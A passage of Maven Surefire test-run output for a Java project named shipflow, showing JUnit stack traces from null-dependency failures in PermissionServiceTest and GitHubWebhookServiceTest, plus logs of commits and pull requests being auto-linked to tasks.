	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.updatePermission_WithInvalidId_ShouldThrowException(PermissionServiceTest.java:354)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.deletePermission_WithInvalidId_ShouldThrowException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.deletePermission(PermissionService.java:241)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$deletePermission_WithInvalidId_ShouldThrowException$6(PermissionServiceTest.java:383)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.deletePermission_WithInvalidId_ShouldThrowException(PermissionServiceTest.java:384)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.QAServiceTest
[WARNING] Tests run: 1, Failures: 0, Errors: 0, Skipped: 1, Time elapsed: 0 s -- in com.github.farzadsedaghatbin.shipflow.service.QAServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MeetingServiceTest
[INFO] Tests run: 16, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.114 s -- in com.github.farzadsedaghatbin.shipflow.service.MeetingServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest$VarianceAnalysisTests
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.062 s -- in com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest$VarianceAnalysisTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest$RiskDistributionTests
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest$RiskDistributionTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest$EnhancedCycleReportTests
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s -- in com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest$EnhancedCycleReportTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.069 s -- in com.github.farzadsedaghatbin.shipflow.service.ReportServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.github.GitHubIntegrationServiceTest
2026-01-17T23:26:53.338Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked commit abc123def456 to task PROJ-42 (Jira-style)
2026-01-17T23:26:53.339Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked commit abc123def456 to task MYAPP-100 (Jira-style)
2026-01-17T23:26:53.339Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked commit abc123def456 to task PROJ-42 (Jira-style)
2026-01-17T23:26:53.341Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked PR #123 to task PROJ-42 (Jira-style)
2026-01-17T23:26:53.341Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked PR #123 to task PROJ-42 (Jira-style)
2026-01-17T23:26:53.341Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-closed task Closes PROJ-42 due to merged PR #123 (Jira-style)
2026-01-17T23:26:53.342Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked commit abc123def456 to task #42
2026-01-17T23:26:53.345Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked PR #123 to task PROJ-42 (Jira-style)
2026-01-17T23:26:53.345Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.g.GitHubIntegrationService     : Auto-linked PR #123 to task PROJ-42 (Jira-style)
[INFO] Tests run: 10, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.338 s -- in com.github.farzadsedaghatbin.shipflow.service.github.GitHubIntegrationServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookServiceTest
2026-01-17T23:26:53.411Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.github.GitHubWebhookService    : Error processing push event

java.lang.NullPointerException: Cannot invoke "com.fasterxml.jackson.databind.JsonNode.asText()" because the return value of "com.fasterxml.jackson.databind.JsonNode.get(String)" is null
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookService.processPushEvent(GitHubWebhookService.java:116) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookService.processWebhook(GitHubWebhookService.java:84) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookServiceTest.processWebhook_ShouldCreateWebhookEvent(GitHubWebhookServiceTest.java:100) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:53.412Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.github.GitHubWebhookService    : Error processing webhook event

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookService.processPushEvent(GitHubWebhookService.java:144) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookService.processWebhook(GitHubWebhookService.java:84) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookServiceTest.processWebhook_ShouldCreateWebhookEvent(GitHubWebhookServiceTest.java:100) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
